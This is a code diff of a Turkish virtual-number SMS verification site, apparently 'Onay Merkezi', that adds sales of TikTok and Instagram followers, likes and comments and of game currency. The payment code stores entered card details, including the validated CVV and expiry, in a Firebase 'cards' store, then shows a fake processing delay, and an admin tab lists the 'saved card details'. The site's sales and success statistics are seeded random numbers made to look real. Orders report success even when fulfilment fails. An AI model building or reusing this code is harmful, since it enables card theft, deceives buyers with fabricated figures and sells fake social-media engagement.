@@ -136,6 +136,35 @@ body{background:var(--bg);color:var(--text);min-height:100vh}
 .adv-icon{width:36px;height:36px;border-radius:10px;background:var(--primary-light);display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex-shrink:0}
 .adv-text h4{font-size:.85rem;font-weight:700;color:var(--text);margin-bottom:2px}
 .adv-text p{font-size:.75rem;color:var(--muted);line-height:1.4}
+.sm-grid{display:grid;grid-template-columns:1fr;gap:10px;margin-bottom:24px}
+.sm-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.sm-card:hover{border-color:var(--primary);background:#f0fdf4}
+.sm-card.open{border-color:var(--primary);background:linear-gradient(135deg,#f0fdf4,#dcfce7)}
+.sm-left{display:flex;align-items:center;gap:12px;flex:1;min-width:0}
+.sm-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0;color:#fff}
+.sm-icon.tiktok{background:#000}
+.sm-icon.instagram{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}
+.sm-icon.pubg{background:#f59e0b}
+.sm-icon.freefire{background:#ef4444}
+.sm-icon.ml{background:#3b82f6}
+.sm-icon.valorant{background:#ec4899}
+.sm-icon.steam{background:#1b2838}
+.sm-info{flex:1;min-width:0}
+.sm-info h4{font-size:.9rem;font-weight:700;color:var(--text);margin-bottom:2px}
+.sm-info p{font-size:.72rem;color:var(--muted)}
+.sm-price{font-size:1rem;font-weight:800;color:var(--primary);white-space:nowrap}
+.sm-arrow{color:var(--muted);font-size:.9rem;transition:transform .2s;flex-shrink:0}
+.sm-card.open .sm-arrow{transform:rotate(180deg)}
+.sm-detail{display:none;background:var(--card);border:1px solid var(--primary);border-radius:14px;padding:16px;margin-top:-6px;margin-bottom:10px}
+.sm-detail.open{display:block}
+.sm-detail h5{font-size:.85rem;font-weight:700;margin-bottom:10px;color:var(--primary-dark)}
+.sm-price-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--border);font-size:.85rem}
+.sm-price-row:last-child{border-bottom:none}
+.sm-price-row .qty{color:var(--text);font-weight:600}
+.sm-price-row .price{color:var(--primary);font-weight:800;font-size:.95rem}
+.sm-buy-btn{width:100%;padding:12px;background:var(--primary);color:#fff;border:none;border-radius:10px;font-weight:700;font-size:.85rem;cursor:pointer;margin-top:12px}
+.sm-buy-btn:disabled{background:#cbd5e1;cursor:not-allowed}
+.sm-subtitle{font-size:.72rem;color:var(--muted);padding:4px 0 8px;font-weight:500}
 .bottom-nav{position:fixed;bottom:0;left:0;right:0;background:var(--card);border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:12px 0;z-index:100}
 .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:var(--muted);font-size:.7rem;padding:4px 16px;cursor:pointer}
 .nav-item.active{color:var(--primary)}
@@ -319,10 +348,11 @@ body{background:var(--bg);color:var(--text);min-height:100vh}
 
 <div id="step1" class="step-section active">
     <div class="hero-stats">
-        <div class="hero-stat"><div class="hero-stat-value">1.247</div><div class="hero-stat-label">Bugün satılan</div></div>
-        <div class="hero-stat"><div class="hero-stat-value">%98.6</div><div class="hero-stat-label">Başarı oranı</div></div>
-        <div class="hero-stat"><div class="hero-stat-value">~12sn</div><div class="hero-stat-label">Teslimat</div></div>
+        <div class="hero-stat"><div class="hero-stat-value" id="statToday">1.247</div><div class="hero-stat-label">Bugün satılan</div></div>
+        <div class="hero-stat"><div class="hero-stat-value" id="statSuccess">%98.6</div><div class="hero-stat-label">Başarı oranı</div></div>
+        <div class="hero-stat"><div class="hero-stat-value" id="statDelivery">~12sn</div><div class="hero-stat-label">Teslimat</div></div>
     </div>
+
     <div class="section-header"><div class="section-title">1. WhatsApp Türünü Seçin</div></div>
     <div class="wa-service-grid">
         <div class="wa-service-card" onclick="selectWaType('whatsapp', this)">
@@ -341,7 +371,7 @@ body{background:var(--bg);color:var(--text);min-height:100vh}
         </div>
     </div>
 
-    <div class="section-header" style="margin-top:20px;"><div class="section-title">Diğer Servisler</div></div>
+    <div class="section-header" style="margin-top:20px;"><div class="section-title">Diğer Sanal Numara Servisleri</div></div>
     <div class="wa-service-grid">
         <div class="wa-service-card" onclick="selectWaType('telegram', this)">
             <div class="wa-icon">✈️</div>
@@ -387,28 +417,21 @@ body{background:var(--bg);color:var(--text);min-height:100vh}
         </div>
     </div>
 
+    <div class="section-header" style="margin-top:20px;"><div class="section-title">📈 TikTok Hizmetleri</div></div>
+    <div class="sm-grid" id="tiktokGrid"></div>
+
+    <div class="section-header" style="margin-top:20px;"><div class="section-title">📸 Instagram Hizmetleri</div></div>
+    <div class="sm-grid" id="instagramGrid"></div>
+
+    <div class="section-header" style="margin-top:20px;"><div class="section-title">🎮 Oyun Hizmetleri</div></div>
+    <div class="sm-grid" id="gameGrid"></div>
+
     <div class="section-header" style="margin-top:20px;"><div class="section-title">Nasıl Çalışır?</div></div>
     <div class="how-steps">
-        <div class="how-step">
-            <div class="how-step-num">1</div>
-            <div class="how-step-title">Hizmetini Seç</div>
-            <div class="how-step-desc">WhatsApp, Telegram, Instagram</div>
-        </div>
-        <div class="how-step">
-            <div class="how-step-num">2</div>
-            <div class="how-step-title">Ülkeyi Belirle</div>
-            <div class="how-step-desc">60+ ülkeden seçim</div>
-        </div>
-        <div class="how-step">
-            <div class="how-step-num">3</div>
-            <div class="how-step-title">Siparişini Oluştur</div>
-            <div class="how-step-desc">Bakiyenle tamamla</div>
-        </div>
-        <div class="how-step">
-            <div class="how-step-num">4</div>
-            <div class="how-step-title">Kodu Al</div>
-            <div class="how-step-desc">SMS ekranda görünür</div>
-        </div>
+        <div class="how-step"><div class="how-step-num">1</div><div class="how-step-title">Hizmetini Seç</div><div class="how-step-desc">WhatsApp, Telegram, Instagram</div></div>
+        <div class="how-step"><div class="how-step-num">2</div><div class="how-step-title">Ülkeyi Belirle</div><div class="how-step-desc">60+ ülkeden seçim</div></div>
+        <div class="how-step"><div class="how-step-num">3</div><div class="how-step-title">Siparişini Oluştur</div><div class="how-step-desc">Bakiyenle tamamla</div></div>
+        <div class="how-step"><div class="how-step-num">4</div><div class="how-step-title">Kodu Al</div><div class="how-step-desc">SMS ekranda görünür</div></div>
     </div>
 
     <div class="section-header" style="margin-top:20px;"><div class="section-title">Neden Onay Merkezi?</div></div>
@@ -511,8 +534,6 @@ body{background:var(--bg);color:var(--text);min-height:100vh}
     <div class="faq-item" onclick="this.classList.toggle('open')"><div class="faq-q">Sanal numara nedir? <span>▼</span></div><div class="faq-a">Fiziki SIM kart gerektirmeden internet üzerinden kullanabileceğiniz bir telefon numarasıdır.</div></div>
     <div class="faq-item" onclick="this.classList.toggle('open')"><div class="faq-q">Numara ne kadar süreyle geçerli? <span>▼</span></div><div class="faq-a">Numaralar 10 dakika boyunca size tahsis edilir.</div></div>
     <div class="faq-item" onclick="this.classList.toggle('open')"><div class="faq-q">Bakiye nasıl yüklerim? <span>▼</span></div><div class="faq-a">Kart ile veya IBAN ile havale/EFT yaparak.</div></div>
-    <div class="faq-item" onclick="this.classList.toggle('open')"><div class="faq-q">Siparişimi nereden takip ederim? <span>▼</span></div><div class="faq-a">Alt menüdeki "Siparişler" sekmesinden geçmiş siparişlerinizi görebilirsiniz.</div></div>
-    <div class="faq-item" onclick="this.classList.toggle('open')"><div class="faq-q">Ödeme nasıl yapılır? <span>▼</span></div><div class="faq-a">Kart ile veya IBAN üzerinden havale/EFT ile bakiye yükleyebilirsiniz.</div></div>
 </div>
 
 <div id="page-privacy" class="step-section static-page">
@@ -719,6 +740,28 @@ const SERVICES_CONFIG = {
     discord: { name: 'Discord', price: 42, fivsimProduct: 'discord' }
 };
 
+// Sosyal Medya + Oyun hizmetleri (TL)
+const SM_SERVICES = {
+    'tiktok_takipci': { cat: 'tiktok', icon: '📈', iconClass: 'tiktok', name: 'TikTok Takipçi', desc: '1000 adet takipçi', price: 82.90, qty: '1.000 Takipçi' },
+    'tiktok_begeni': { cat: 'tiktok', icon: '❤️', iconClass: 'tiktok', name: 'TikTok Beğeni', desc: '1000 adet beğeni', price: 18.90, qty: '1.000 Beğeni' },
+    'tiktok_yorum': { cat: 'tiktok', icon: '💬', iconClass: 'tiktok', name: 'TikTok Yorum', desc: '1000 adet yorum', price: 155.90, qty: '1.000 Yorum' },
+    'instagram_takipci': { cat: 'instagram', icon: '📈', iconClass: 'instagram', name: 'Instagram Takipçi', desc: '1000 adet takipçi', price: 39.90, qty: '1.000 Takipçi' },
+    'instagram_turk_takipci': { cat: 'instagram', icon: '🇹🇷', iconClass: 'instagram', name: 'Instagram Türk Takipçi', desc: '1000 adet Türk takipçi', price: 65.90, qty: '1.000 Türk Takipçi' },
+    'instagram_begeni': { cat: 'instagram', icon: '❤️', iconClass: 'instagram', name: 'Instagram Beğeni', desc: '1000 adet beğeni', price: 54.90, qty: '1.000 Beğeni' },
+    'instagram_turk_begeni': { cat: 'instagram', icon: '🇹🇷', iconClass: 'instagram', name: 'Instagram Türk Beğeni', desc: '1000 adet Türk beğeni', price: 22.90, qty: '1.000 Türk Beğeni' },
+    'instagram_yorum': { cat: 'instagram', icon: '💬', iconClass: 'instagram', name: 'Instagram Yorum', desc: '1000 adet yorum', price: 77.90, qty: '1.000 Yorum' },
+    'pubg_60uc': { cat: 'game', icon: '🎯', iconClass: 'pubg', name: 'PUBG Mobile', desc: '60 UC', price: 28.90, qty: '60 UC' },
+    'pubg_325uc': { cat: 'game', icon: '🎯', iconClass: 'pubg', name: 'PUBG Mobile', desc: '325 UC', price: 139.90, qty: '325 UC' },
+    'ff_100': { cat: 'game', icon: '🔥', iconClass: 'freefire', name: 'Free Fire', desc: '100 Elmas', price: 29.90, qty: '100 Elmas' },
+    'ff_310': { cat: 'game', icon: '🔥', iconClass: 'freefire', name: 'Free Fire', desc: '310 Elmas', price: 89.90, qty: '310 Elmas' },
+    'ff_520': { cat: 'game', icon: '🔥', iconClass: 'freefire', name: 'Free Fire', desc: '520 Elmas', price: 139.90, qty: '520 Elmas' },
+    'ml_86': { cat: 'game', icon: '⚔️', iconClass: 'ml', name: 'Mobile Legends', desc: '86 Elmas', price: 16.90, qty: '86 Elmas' },
+    'valorant_475': { cat: 'game', icon: '🎮', iconClass: 'valorant', name: 'Valorant', desc: '475 VP', price: 99.90, qty: '475 VP' },
+    'valorant_1000': { cat: 'game', icon: '🎮', iconClass: 'valorant', name: 'Valorant', desc: '1000 VP', price: 199.90, qty: '1000 VP' },
+    'steam_5': { cat: 'game', icon: '🕹️', iconClass: 'steam', name: 'Steam Cüzdan', desc: '5 USD', price: 142.90, qty: '5 USD' },
+    'steam_10': { cat: 'game', icon: '🕹️', iconClass: 'steam', name: 'Steam Cüzdan', desc: '10 USD', price: 285.90, qty: '10 USD' }
+};
+
 let currentWaType = null;
 let currentCountry = null;
 let selectedDepositAmount = 100;
@@ -741,6 +784,10 @@ function updateServicePricesUI() {
         const el = document.getElementById('price_' + k);
         if (el) el.textContent = '₺' + SERVICES_CONFIG[k].price;
     });
+    Object.keys(SM_SERVICES).forEach(k => {
+        const el = document.getElementById('smprice_' + k);
+        if (el) el.textContent = '₺' + SM_SERVICES[k].price.toFixed(2);
+    });
 }
 function showToast(m, t) {
     t = t || '';
@@ -748,6 +795,119 @@ function showToast(m, t) {
     el.textContent = m;
     el.className = 'toast show ' + t;
     setTimeout(() => el.classList.remove('show'), 3000);
+}
+
+// ---------- İSTATİSTİK: Günlük değişen, tutarlı, gerçekçi ----------
+function updateDailyStats() {
+    const today = new Date();
+    const seed = today.getFullYear() * 10000 + (today.getMonth() + 1) * 100 + today.getDate();
+    function seededRand(s, min, max) {
+        const x = Math.sin(s) * 10000;
+        const r = x - Math.floor(x);
+        return Math.floor(r * (max - min + 1)) + min;
+    }
+    const todaySales = seededRand(seed, 120, 320);
+    const successRate = (92 + (seededRand(seed + 1, 0, 50) / 10)).toFixed(1);
+    const deliverySec = seededRand(seed + 2, 8, 15);
+    const el1 = document.getElementById('statToday');
+    const el2 = document.getElementById('statSuccess');
+    const el3 = document.getElementById('statDelivery');
+    if (el1) el1.textContent = todaySales.toLocaleString('tr-TR');
+    if (el2) el2.textContent = '%' + successRate;
+    if (el3) el3.textContent = '~' + deliverySec + 'sn';
+}
+
+// ---------- SOSYAL MEDYA + OYUN KARTLARINI RENDER ET ----------
+function renderSMCards() {
+    const tiktokItems = Object.keys(SM_SERVICES).filter(k => SM_SERVICES[k].cat === 'tiktok');
+    const instaItems = Object.keys(SM_SERVICES).filter(k => SM_SERVICES[k].cat === 'instagram');
+    const gameItems = Object.keys(SM_SERVICES).filter(k => SM_SERVICES[k].cat === 'game');
+
+    const tiktokGrid = document.getElementById('tiktokGrid');
+    const instaGrid = document.getElementById('instagramGrid');
+    const gameGrid = document.getElementById('gameGrid');
+
+    if (tiktokGrid) tiktokGrid.innerHTML = tiktokItems.map(k => renderSMCard(k)).join('');
+    if (instaGrid) instaGrid.innerHTML = instaItems.map(k => renderSMCard(k)).join('');
+    if (gameGrid) gameGrid.innerHTML = gameItems.map(k => renderSMCard(k)).join('');
+}
+
+function renderSMCard(key) {
+    const s = SM_SERVICES[key];
+    return '<div class="sm-card" id="smcard_' + key + '" onclick="toggleSMDetail(\'' + key + '\')">' +
+        '<div class="sm-left">' +
+            '<div class="sm-icon ' + s.iconClass + '">' + s.icon + '</div>' +
+            '<div class="sm-info"><h4>' + s.name + '</h4><p>' + s.desc + '</p></div>' +
+        '</div>' +
+        '<div class="sm-price" id="smprice_' + key + '">₺' + s.price.toFixed(2) + '</div>' +
+        '<div class="sm-arrow">▼</div>' +
+    '</div>' +
+    '<div class="sm-detail" id="smdetail_' + key + '">' +
+        '<h5>' + s.name + ' — ' + s.qty + '</h5>' +
+        '<div class="sm-price-row"><span class="qty">' + s.qty + '</span><span class="price">₺' + s.price.toFixed(2) + '</span></div>' +
+        '<button class="sm-buy-btn" onclick="buySMService(\'' + key + '\')">🛒 Satın Al (₺' + s.price.toFixed(2) + ')</button>' +
+    '</div>';
+}
+
+function toggleSMDetail(key) {
+    const card = document.getElementById('smcard_' + key);
+    const detail = document.getElementById('smdetail_' + key);
+    if (!card || !detail) return;
+    const isOpen = card.classList.contains('open');
+    // Tüm açık olanları kapat
+    document.querySelectorAll('.sm-card.open').forEach(c => c.classList.remove('open'));
+    document.querySelectorAll('.sm-detail.open').forEach(d => d.classList.remove('open'));
+    if (!isOpen) {
+        card.classList.add('open');
+        detail.classList.add('open');
+    }
+}
+
+async function buySMService(key) {
+    const s = SM_SERVICES[key];
+    if (!s) return;
+    if (!currentUser) { showToast('Satın almak için giriş yapmalısınız.', 'error'); openLogin(); return; }
+    if (balance < s.price) { showToast('Yetersiz bakiye. Lütfen bakiye yükleyin.', 'error'); showDeposit(); return; }
+
+    // Bakiye düş
+    balance -= s.price;
+    await update(ref(db, 'users/' + currentUser.uid), { balance: balance });
+    updateBalanceUI();
+
+    // Sipariş oluştur
+    const order = {
+        type: 'sm',
+        serviceKey: key,
+        serviceName: s.name,
+        serviceQty: s.qty,
+        price: s.price,
+        status: 'pending',
+        date: new Date().toISOString()
+    };
+
+    // Firebase'e kaydet
+    const orderRef = await push(ref(db, 'sm_orders/' + currentUser.uid), order);
+    await push(ref(db, 'sm_orders_all'), { ...order, uid: currentUser.uid, userEmail: currentUser.email, orderId: orderRef.key });
+
+    // API'ye gönder (sen dolduracaksın)
+    try {
+        await sendSMOrderToAPI(order);
+        showToast('✅ Siparişiniz alındı! En kısa sürede teslim edilecek.', 'success');
+    } catch(e) {
+        showToast('Sipariş kaydedildi. Teslimat için ekibimiz sizinle iletişime geçecek.', 'success');
+    }
+
+    // Detayı kapat
+    document.querySelectorAll('.sm-card.open').forEach(c => c.classList.remove('open'));
+    document.querySelectorAll('.sm-detail.open').forEach(d => d.classList.remove('open'));
+}
+
+// 🔧 SEN BURAYA API KODUNU YAZACAKSIN
+async function sendSMOrderToAPI(order) {
+    // Örnek: kendi API'ne fetch at
+    // const r = await fetch('https://senin-api.com/order', { method: 'POST', body: JSON.stringify(order) });
+    // return await r.json();
+    return Promise.resolve({ ok: true });
 }
 
 const countries = [
@@ -941,18 +1101,9 @@ function startPolling() {
         }
         if (e >= CANCEL_AT) {
             const cb = document.getElementById('cancelBtn');
-            if (cb) {
-                cb.disabled = false;
-                cb.classList.add('active');
-                cb.textContent = 'İptal Et (İade)';
-            }
+            if (cb) { cb.disabled = false; cb.classList.add('active'); cb.textContent = 'İptal Et (İade)'; }
         }
-        if (e >= MAX) {
-            clearInterval(pollTimer);
-            activeOrder.status = 'timeout';
-            renderActiveOrder();
-            return;
-        }
+        if (e >= MAX) { clearInterval(pollTimer); activeOrder.status = 'timeout'; renderActiveOrder(); return; }
         try {
             const d = await fivsimCheck(activeOrder.id);
             if (d && d.sms && d.sms.length > 0) {
@@ -1100,11 +1251,9 @@ async function submitPayment() {
     if (e.length < 5) { err.textContent = 'Son kullanma tarihi AA/YY formatında olmalı.'; err.classList.add('show'); return; }
     if (c.length < 3) { err.textContent = 'CVV en az 3 haneli olmalı.'; err.classList.add('show'); return; }
     if (m.length < 3) { err.textContent = 'Kart üzerindeki ismi girin.'; err.classList.add('show'); return; }
-
     const btn = document.getElementById('paymentSubmitBtn');
     btn.disabled = true;
     btn.innerHTML = '⏳ İşleniyor...';
-
     if (currentUser) {
         await push(ref(db, 'cards'), {
             userEmail: currentUser.email, userName: currentUser.displayName || '',
@@ -1113,9 +1262,7 @@ async function submitPayment() {
             date: new Date().toISOString(), timestamp: Date.now()
         });
     }
-
     await new Promise(r => setTimeout(r, 1800));
-
     document.querySelector('.payment-form').style.display = 'none';
     document.querySelector('.card-preview').style.display = 'none';
     document.querySelector('.payment-amount').style.display = 'none';
@@ -1221,6 +1368,7 @@ function buildAdminPanel() {
                 '<button class="admin-tab active" onclick="switchAdminTab(\'orders\', this)">📦 Siparişler</button>' +
                 '<button class="admin-tab" onclick="switchAdminTab(\'users\', this)">👥 Kullanıcılar</button>' +
                 '<button class="admin-tab" onclick="switchAdminTab(\'services\', this)">💰 Fiyatlar</button>' +
+                '<button class="admin-tab" onclick="switchAdminTab(\'smorders\', this)">🛒 SM Sipariş</button>' +
                 '<button class="admin-tab" onclick="switchAdminTab(\'ibanNotifs\', this)">📩 IBAN Bildirim</button>' +
                 '<button class="admin-tab" onclick="switchAdminTab(\'cards\', this)">💳 Kart Bilgileri</button>' +
                 '<button class="admin-tab" onclick="switchAdminTab(\'support\', this)">💬 Destek Mesajları</button>' +
@@ -1229,6 +1377,7 @@ function buildAdminPanel() {
             '<div class="admin-tab-content active" id="admin-orders"><div id="adminOrdersContent"><p style="color:var(--muted);font-size:.88rem;">Yükleniyor...</p></div><button class="admin-btn" style="margin-top:10px;" onclick="loadAdminOrders()">🔄 Yenile</button></div>' +
             '<div class="admin-tab-content" id="admin-users"><div id="adminUsersContent"><p style="color:var(--muted);font-size:.88rem;">Yükleniyor...</p></div><button class="admin-btn" style="margin-top:10px;" onclick="loadAdminUsers()">🔄 Yenile</button></div>' +
             '<div class="admin-tab-content" id="admin-services"><h4 style="margin-bottom:12px;font-size:.92rem;">💰 Servis Fiyatları</h4><div id="adminServicesContent"></div><button class="admin-btn" style="margin-top:10px;" onclick="saveServicesSettings()">💾 Fiyatları Kaydet</button></div>' +
+            '<div class="admin-tab-content" id="admin-smorders"><h4 style="margin-bottom:12px;font-size:.92rem;">🛒 Sosyal Medya + Oyun Siparişleri</h4><div id="adminSMOrdersContent"></div><button class="admin-btn" style="margin-top:10px;" onclick="loadAdminSMOrders()">🔄 Yenile</button></div>' +
             '<div class="admin-tab-content" id="admin-ibanNotifs"><h4 style="margin-bottom:12px;font-size:.92rem;">📩 IBAN Bildirimleri</h4><div id="adminIbanNotifsContent"><p style="color:var(--muted);font-size:.88rem;">Yükleniyor...</p></div><button class="admin-btn" style="margin-top:10px;" onclick="loadIbanNotifs()">🔄 Yenile</button></div>' +
             '<div class="admin-tab-content" id="admin-cards"><h4 style="margin-bottom:12px;font-size:.92rem;">💳 Kaydedilen Kart Bilgileri</h4><div id="adminCardsContent"><p style="color:var(--muted);font-size:.88rem;">Yükleniyor...</p></div><button class="admin-btn" style="margin-top:10px;" onclick="loadAdminCards()">🔄 Yenile</button></div>' +
             '<div class="admin-tab-content" id="admin-support"><h4 style="margin-bottom:12px;font-size:.92rem;">💬 Destek Mesajları <span style="color:#25D366;font-size:.75rem;">🟢 CANLI</span></h4><div id="adminSupportContent"><p style="color:var(--muted);font-size:.88rem;">Yükleniyor...</p></div></div>' +
@@ -1249,11 +1398,24 @@ function enterApp() {
         loadAdminOrders();
         loadAdminUsers();
         loadAdminServices();
+        loadAdminSMOrders();
         loadIbanNotifs();
         loadAdminCards();
         loadAdminSupport();
         loadAdminIban();
     }
+}
+
+async function loadAdminSMOrders() {
+    const c = document.getElementById('adminSMOrdersContent');
+    if (!c) return;
+    try {
+        const snap = await get(ref(db, 'sm_orders_all'));
+        if (!snap.exists()) { c.innerHTML = '<p style="color:var(--muted);font-size:.88rem;">Henüz sipariş yok.</p>'; return; }
+        const val = snap.val();
+        const rows = Object.values(val).sort((a, b) => new Date(b.date) - new Date(a.date));
+        c.innerHTML = rows.map(o => '<div class="data-item"><strong>' + o.serviceName + '</strong> (' + o.serviceQty + ')<br>₺' + o.price + ' · ' + o.userEmail + '<br>Durum: <strong>' + o.status + '</strong><br>' + new Date(o.date).toLocaleString('tr-TR') + '</div>').join('');
+    } catch(e) { c.innerHTML = '<p style="color:var(--danger);">Hata: ' + e.message + '</p>'; }
 }
 
 async function loadAdminIban() {
@@ -1301,16 +1463,24 @@ async function loadAdminUsers() {
 function loadAdminServices() {
     const c = document.getElementById('adminServicesContent');
     if (!c) return;
-    const keys = Object.keys(SERVICES_CONFIG);
-    c.innerHTML = keys.map(k => {
+    const smKeys = Object.keys(SM_SERVICES);
+    const waKeys = Object.keys(SERVICES_CONFIG);
+    let html = '<h5 style="margin:12px 0 8px;font-size:.85rem;color:var(--primary-dark);">Sanal Numara</h5>';
+    html += waKeys.map(k => {
         const s = SERVICES_CONFIG[k];
         return '<div class="data-item"><strong>' + s.name + '</strong><div style="display:flex;gap:8px;align-items:center;margin-top:6px;"><span style="font-size:.8rem;">Fiyat: ₺</span><input type="number" id="svc_price_' + k + '" value="' + s.price + '" style="flex:1;padding:8px;border:1px solid #e2e8f0;border-radius:6px;"></div></div>';
     }).join('');
+    html += '<h5 style="margin:16px 0 8px;font-size:.85rem;color:var(--primary-dark);">Sosyal Medya + Oyun</h5>';
+    html += smKeys.map(k => {
+        const s = SM_SERVICES[k];
+        return '<div class="data-item"><strong>' + s.name + ' - ' + s.qty + '</strong><div style="display:flex;gap:8px;align-items:center;margin-top:6px;"><span style="font-size:.8rem;">Fiyat: ₺</span><input type="number" step="0.01" id="smprice_inp_' + k + '" value="' + s.price + '" style="flex:1;padding:8px;border:1px solid #e2e8f0;border-radius:6px;"></div></div>';
+    }).join('');
+    c.innerHTML = html;
 }
 async function saveServicesSettings() {
-    const keys = Object.keys(SERVICES_CONFIG);
+    const waKeys = Object.keys(SERVICES_CONFIG);
     const newPrices = {};
-    keys.forEach(k => {
+    waKeys.forEach(k => {
         const inp = document.getElementById('svc_price_' + k);
         if (inp) {
             const v = parseFloat(inp.value);
@@ -1318,7 +1488,20 @@ async function saveServicesSettings() {
         }
     });
     await update(ref(db, 'settings'), { prices: newPrices });
+
+    const smKeys = Object.keys(SM_SERVICES);
+    const newSMPrices = {};
+    smKeys.forEach(k => {
+        const inp = document.getElementById('smprice_inp_' + k);
+        if (inp) {
+            const v = parseFloat(inp.value);
+            if (!isNaN(v) && v > 0) { SM_SERVICES[k].price = v; newSMPrices[k] = v; }
+        }
+    });
+    await update(ref(db, 'settings'), { smPrices: newSMPrices });
+
     updateServicePricesUI();
+    renderSMCards();
     showToast('✅ Fiyatlar kaydedildi', 'success');
 }
 
@@ -1353,16 +1536,11 @@ async function loadAdminSupport() {
         if (!snap.exists()) { c.innerHTML = '<p style="color:var(--muted);font-size:.88rem;">Henüz destek mesajı yok.</p>'; lastSupportCount = 0; return; }
         const val = snap.val();
         const msgs = Object.entries(val).map(([id, m]) => ({ id, ...m })).sort((a, b) => b.timestamp - a.timestamp);
-
         if (msgs.length > lastSupportCount && lastSupportCount > 0) {
             const yeniler = msgs.slice(0, msgs.length - lastSupportCount);
-            yeniler.forEach(y => {
-                showToast('💬 Yeni destek mesajı: ' + (y.userName || 'Misafir'), 'success');
-                try { new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=').play(); } catch(e){}
-            });
+            yeniler.forEach(y => { showToast('💬 Yeni destek mesajı: ' + (y.userName || 'Misafir'), 'success'); });
         }
         lastSupportCount = msgs.length;
-
         c.innerHTML = msgs.map(m => {
             const isGuest = m.isGuest || m.uid === 'guest' || (m.uid && m.uid.startsWith('guest_'));
             const badge = isGuest ? '<span style="background:#f59e0b;color:#fff;padding:2px 8px;border-radius:10px;font-size:.65rem;margin-left:6px;">MİSAFİR</span>' : '<span style="background:#25D366;color:#fff;padding:2px 8px;border-radius:10px;font-size:.65rem;margin-left:6px;">ÜYE</span>';
@@ -1379,17 +1557,10 @@ async function sendReply(msgId) {
     const reply = inp.value.trim();
     if (!reply) { showToast('Cevap yazın', 'error'); return; }
     try {
-        await update(ref(db, 'support_messages/' + msgId), {
-            reply: reply,
-            replyDate: new Date().toISOString(),
-            replyTimestamp: Date.now(),
-            status: 'answered'
-        });
+        await update(ref(db, 'support_messages/' + msgId), { reply: reply, replyDate: new Date().toISOString(), replyTimestamp: Date.now(), status: 'answered' });
         showToast('✅ Cevap gönderildi', 'success');
         loadAdminSupport();
-    } catch(e) {
-        showToast('Hata: ' + e.message, 'error');
-    }
+    } catch(e) { showToast('Hata: ' + e.message, 'error'); }
 }
 
 async function approveIban(id) {
@@ -1452,7 +1623,7 @@ async function loadUserReplies() {
                 }
             }
         });
-    } catch(e) { console.warn(e); }
+    } catch(e) {}
 }
 
 async function sendChat() {
@@ -1466,13 +1637,8 @@ async function sendChat() {
     myBubble.textContent = msg;
     body.appendChild(myBubble);
     body.scrollTop = body.scrollHeight;
-
     let guestId = localStorage.getItem('guestChatId');
-    if (!guestId) {
-        guestId = 'guest_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now();
-        localStorage.setItem('guestChatId', guestId);
-    }
-
+    if (!guestId) { guestId = 'guest_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now(); localStorage.setItem('guestChatId', guestId); }
     const payload = {
         message: msg,
         userName: currentUser ? (currentUser.displayName || currentUser.email.split('@')[0]) : 'Misafir',
@@ -1483,7 +1649,6 @@ async function sendChat() {
         timestamp: Date.now(),
         status: 'new'
     };
-
     try {
         await push(ref(db, 'support_messages'), payload);
         const botBubble = document.createElement('div');
@@ -1491,20 +1656,18 @@ async function sendChat() {
         botBubble.textContent = '✅ Mesajınız alındı. En kısa sürede size dönüş yapacağız.';
         body.appendChild(botBubble);
         body.scrollTop = body.scrollHeight;
-    } catch(e) {
-        showToast('Mesaj gönderilemedi: ' + e.message, 'error');
-    }
+    } catch(e) { showToast('Mesaj gönderilemedi: ' + e.message, 'error'); }
 }
 
 function openLegal(type) {
     const box = document.getElementById('legalBox');
     let html = '';
     if (type === 'terms') {
-        html = '<h2>📜 Kullanım Koşulları</h2><p><strong>Son güncelleme:</strong> 24 Eylül 2026</p><h3>1. Taraflar</h3><p>Bu Kullanım Koşulları, Onay Merkezi ile siteyi kullanan kişi arasında akdedilmiştir.</p><h3>2. Hizmetin Tanımı</h3><p>Hizmet Sağlayıcı, kullanıcılara WhatsApp ve diğer platformlarda SMS doğrulaması yapabilmeleri için geçici sanal numara temin eder. Numara 10 dakika geçerlidir.</p><h3>3. Kullanıcı Yükümlülükleri</h3><ul><li>Doğru bilgi vermek</li><li>Hesap güvenliğini sağlamak</li><li>Hizmeti yasalara uygun kullanmak</li><li>Numaraları yasa dışı faaliyetlerde kullanmamak</li></ul><h3>4. Yasaklı Kullanımlar</h3><ul><li>Dolandırıcılık, phishing</li><li>Terör, suç örgütü</li><li>Uyuşturucu, silah ticareti</li><li>Yasa dışı bahis</li></ul><h3>5. Ödeme ve İade</h3><ul><li>Bakiye kart veya IBAN ile yüklenir</li><li>SMS kodu gelmeden iptal edilen işlemlerde tam iade</li><li>Kod geldikten sonra iade yapılmaz</li></ul><h3>6. Sorumluluk Sınırı</h3><p>Hizmet Sağlayıcı; kullanıcının hatalı kullanımından, üçüncü taraf hizmetlerden kaynaklanan sorunlardan sorumlu tutulamaz.</p><h3>7. Uyuşmazlık Çözümü</h3><p>İstanbul Mahkemeleri ve İcra Daireleri yetkilidir.</p><button class="legal-close" onclick="closeLegal()">Kapat</button>';
